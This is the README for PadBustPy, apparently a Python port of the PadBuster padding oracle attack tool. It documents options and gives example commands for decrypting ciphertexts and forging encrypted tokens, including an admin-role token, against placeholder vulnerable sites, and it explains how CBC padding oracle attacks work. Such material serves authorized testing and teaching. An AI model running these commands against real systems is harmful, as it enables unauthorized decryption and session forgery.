# PadBustPy

**A Python 3 Port of PadBuster - Automated Padding Oracle Attack Tool**

The objective of this project was to rewrite the tool [PadBuster](https://github.com/strozfriedberg/PadBuster) in Python3.

> Original Project: [https://github.com/strozfriedberg/PadBuster](https://github.com/strozfriedberg/PadBuster)


[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
  - [Basic Syntax](#basic-syntax)
  - [Decrypt Mode](#decrypt-mode)
  - [Encrypt Mode](#encrypt-mode)
  - [Brute Force Mode](#brute-force-mode)
- [Command Line Options](#command-line-options)
- [Encoding Formats](#encoding-formats)
- [Examples](#examples)
- [How Padding Oracle Attacks Work](#how-padding-oracle-attacks-work)
- [Testing](#testing)
- [Troubleshooting](#troubleshooting)
- [Credits](#credits)
- [Legal Disclaimer](#legal-disclaimer)

---

## Overview

PadBustPy is a Python 3 implementation of the classic PadBuster tool, originally written in Perl by Brian Holyfield of Gotham Digital Science. This tool automates the exploitation of padding oracle vulnerabilities in web applications that use block cipher encryption (typically AES-CBC or DES-CBC).

A **padding oracle vulnerability** occurs when a web application reveals whether the padding of an encrypted message is valid or invalid through different error responses, timing differences, or behavioral changes. This information leakage can be exploited to:

1. **Decrypt** encrypted data without knowing the encryption key
2. **Encrypt** arbitrary plaintext without knowing the encryption key
3. **Forge** valid encrypted tokens/cookies

---

## Features

- **Decrypt Mode**: Decrypt encrypted samples using the padding oracle
- **Encrypt Mode**: Encrypt arbitrary plaintext using the padding oracle
- **Brute Force Mode**: Brute force the first block when IV is unknown
- **Multiple Encoding Formats**: Base64, Hex (upper/lower), .NET UrlToken, WebSafe Base64
- **Automatic Response Analysis**: Detects oracle signatures when no error string is provided
- **HTTP Features**:
  - GET and POST request support
  - Cookie manipulation
  - Custom headers
  - HTTP Basic Authentication
  - Proxy support with authentication
- **Interactive Mode**: Manual confirmation of discovered bytes
- **Resume Capability**: Resume interrupted decrypt/brute force sessions
- **Logging**: Optional file logging for analysis
- **Verbose Output**: Multiple verbosity levels for debugging

---

## Installation

### Prerequisites

- Python 3.8 or higher
- pip (Python package installer)

### Install Dependencies

```bash
pip install requests
```

### Clone/Download

```bash
# Clone the repository (if applicable)
git clone https://github.com/yourusername/padbustpy.git
cd padbustpy

# Or download directly
wget https://raw.githubusercontent.com/yourusername/padbustpy/main/padbustpy.py
chmod +x padbustpy.py
```

---

## Usage

### Basic Syntax

```bash
python padbustpy.py <URL> <EncryptedSample> <BlockSize> [options]
```

**Required Arguments:**

| Argument | Description |
|----------|-------------|
| `URL` | The target URL containing the encrypted sample |
| `EncryptedSample` | The encrypted value to test (must appear in URL, POST data, or cookies) |
| `BlockSize` | The cipher block size (typically 8 for DES or 16 for AES) |

### Decrypt Mode

Decrypt mode is the default operation. It decrypts the encrypted sample by exploiting the padding oracle.

```bash
# Basic decrypt with automatic response analysis
python padbustpy.py "http://target.com/page?token=ABC123" "ABC123" 16

# Decrypt with known error string
python padbustpy.py "http://target.com/page?token=ABC123" "ABC123" 16 -error "Invalid padding"

# Decrypt without IV (first block unknown)
python padbustpy.py "http://target.com/page?token=ABC123" "ABC123" 16 -noiv
```

### Encrypt Mode

Encrypt mode allows you to create valid encrypted values for arbitrary plaintext.

```bash
# Encrypt plaintext
python padbustpy.py "http://target.com/page?token=ABC123" "ABC123" 16 \
    -plaintext "user=admin"

# Encrypt with encoded input
python padbustpy.py "http://target.com/page?token=ABC123" "ABC123" 16 \
    -encodedtext "dXNlcj1hZG1pbg=="

# Encrypt with known intermediate bytes (speeds up the process)
python padbustpy.py "http://target.com/page?token=ABC123" "ABC123" 16 \
    -plaintext "admin" -intermediate "0x0011223344556677"
```

### Brute Force Mode

Brute force mode attempts to discover valid padding for unknown IV scenarios.

```bash
python padbustpy.py "http://target.com/page?token=ABC123" "ABC123" 16 -bruteforce

# Resume brute force from specific attempt
python padbustpy.py "http://target.com/page?token=ABC123" "ABC123" 16 \
    -bruteforce -resume 5000
```

---

## Command Line Options

### Core Options

| Option | Description |
|--------|-------------|
| `-error <string>` | The padding error message to look for in responses |
| `-encoding <0-4>` | Encoding format of the sample (default: 0=Base64) |
| `-prefix <bytes>` | Prefix bytes to prepend to each test sample (encoded) |
| `-noiv` | Sample does not include IV (attempt to decrypt first block) |
| `-noencode` | Do not URL-encode the payload |

### HTTP Options

| Option | Description |
|--------|-------------|
| `-post <data>` | HTTP POST data string |
| `-cookies <string>` | HTTP cookies (format: `name1=value1; name2=value2`) |
| `-headers <string>` | Custom headers (format: `name1::value1;name2::value2`) |
| `-auth <user:pass>` | HTTP Basic Authentication credentials |
| `-proxy <host:port>` | HTTP/S proxy address |
| `-proxyauth <user:pass>` | Proxy authentication credentials |

### Mode Options

| Option | Description |
|--------|-------------|
| `-plaintext <string>` | Plaintext to encrypt (enables encrypt mode) |
| `-encodedtext <string>` | Encoded data to encrypt |
| `-bruteforce` | Enable brute force mode against first block |
| `-ciphertext <hex>` | Known ciphertext for intermediate bytes (hex-encoded) |
| `-intermediate <hex>` | Known intermediate bytes (hex-encoded) |

### Analysis Options

| Option | Description |
|--------|-------------|
| `-usebody` | Include response body in signature analysis |
| `-interactive` | Prompt for confirmation on each discovered byte |
| `-resume <block>` | Resume decryption at specified block number |

### Output Options

| Option | Description |
|--------|-------------|
| `-log` | Generate log files in `PadBuster.DDMMMYY` folder |
| `-verbose` | Enable verbose output |
| `-veryverbose` | Enable debug-level verbose output |

---

## Encoding Formats

| Value | Format | Description |
|-------|--------|-------------|
| 0 | Base64 | Standard Base64 encoding (default) |
| 1 | Lower HEX | Lowercase hexadecimal |
| 2 | Upper HEX | Uppercase hexadecimal |
| 3 | .NET UrlToken | Microsoft .NET URL token encoding |
| 4 | WebSafe Base64 | URL-safe Base64 (- and _ instead of + and /) |

---

## Examples

### Example 1: Basic Decryption

Decrypt a Base64-encoded cookie value:

```bash
python padbustpy.py \
    "http://vulnerable-app.com/profile?session=dGVzdCBkYXRhIGhlcmU=" \
    "dGVzdCBkYXRhIGhlcmU=" \
    16 \
    -error "Padding is invalid"
```

### Example 2: POST Request with Cookies

Decrypt a token submitted via POST with session cookie:

```bash
python padbustpy.py \
    "http://vulnerable-app.com/api/decrypt" \
    "AABBCCDD11223344" \
    16 \
    -post "token=AABBCCDD11223344&action=view" \
    -cookies "JSESSIONID=abc123; auth=xyz789" \
    -encoding 1
```

### Example 3: Encrypt Arbitrary Data

Create a valid encrypted token for admin access:

```bash
python padbustpy.py \
    "http://vulnerable-app.com/page?token=EXISTING_TOKEN" \
    "EXISTING_TOKEN" \
    16 \
    -plaintext "role=admin;user=attacker"
```

### Example 4: Using a Proxy

Route traffic through Burp Suite for analysis:

```bash
python padbustpy.py \
    "http://vulnerable-app.com/page?data=ENCRYPTED" \
    "ENCRYPTED" \
    16 \
    -proxy "127.0.0.1:8080" \
    -verbose
```

### Example 5: Hex-Encoded Sample with Custom Headers

```bash
python padbustpy.py \
    "http://vulnerable-app.com/api?cipher=0011223344556677" \
    "0011223344556677" \
    8 \
    -encoding 1 \
    -headers "X-Custom-Header::value1;Authorization::Bearer token123"
```

---

## How Padding Oracle Attacks Work

### Background

Block ciphers like AES operate on fixed-size blocks (e.g., 16 bytes). When plaintext doesn't align perfectly with block boundaries, **padding** is added to fill the remaining space.

The most common padding scheme is **PKCS#7**, where:
- If 1 byte of padding is needed: `0x01`
- If 2 bytes are needed: `0x02 0x02`
- If 3 bytes are needed: `0x03 0x03 0x03`
- And so on...

### The Vulnerability

A padding oracle exists when an application reveals whether decrypted data has valid padding. This can manifest as:
- Different error messages ("Invalid padding" vs "Invalid data")
- Different HTTP status codes (500 vs 200)
- Different response lengths
- Timing differences

### The Attack

In CBC mode decryption:
```
Plaintext[i] = Decrypt(Ciphertext[i]) XOR Ciphertext[i-1]
```

By manipulating `Ciphertext[i-1]` and observing padding errors, an attacker can determine the intermediate decryption value `Decrypt(Ciphertext[i])`. Once known, XOR operations reveal the plaintext.

The attack proceeds byte-by-byte from the end of each block:
1. Modify the last byte of the previous block
2. Submit to the oracle
3. When padding is valid (no error), you've found the intermediate byte
4. XOR with the original ciphertext byte to get plaintext
5. Repeat for all bytes

---

## Testing

### Running Unit Tests

```bash
# Run the test generator
python gen_tests.py

# Run the full benchmark suite
python full_bench.py
```

### Setting Up a Test Environment

For safe testing, use a vulnerable-by-design application:

```bash
# Using Docker (recommended)
docker run -d -p 8080:80 vulnerables/web-dvwa

# Or use the provided test server
python -m http.server 8080
```

---

## Troubleshooting

### Common Issues

**"Encrypted Bytes must be evenly divisible by Block Size"**
- Verify the correct block size (8 for DES, 16 for AES)
- Check that the encoding format is correct
- Ensure URL decoding isn't corrupting the sample

**"All of the responses were identical"**
- The application may not be vulnerable
- Try using `-usebody` for more granular response analysis
- Verify the encrypted sample is actually being processed

**"No matching response"**
- The error string may be incorrect
- Try running without `-error` for automatic analysis
- Use `-interactive` mode to manually verify bytes

**"Encrypted sample was not found in the test request"**
- Ensure the sample appears exactly in the URL, POST data, or cookies
- Check for URL encoding issues (use `-noencode` if needed)

### Debug Mode

For detailed debugging information:

```bash
python padbustpy.py <URL> <Sample> <BlockSize> -veryverbose -log
```

This creates detailed log files for each request/response pair.

---

## Credits

- **Original PadBuster**: Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com)
- **Python Port**: Community contribution
- **Padding Oracle Research**: Serge Vaudenay (2002), Thai Duong & Juliano Rizzo (2010)

### References

- [Vaudenay's Original Paper](https://www.iacr.org/archive/eurocrypt2002/23320530/cbc02_e02d.pdf)
- [POET: Padding Oracle Exploitation Tool](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)
- [OWASP Testing Guide - Padding Oracle](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle)

---

## Legal Disclaimer

**This tool is provided for authorized security testing and educational purposes only.**

Unauthorized access to computer systems is illegal. Always obtain proper written authorization before testing any system you do not own. The authors assume no liability for misuse of this software.

Use responsibly and ethically.

---

## License

This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.

---

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## Version History

- **v0.3.3** - Python 3 port with requests library
- **v0.3.2** - Original Perl version by Brian Holyfield
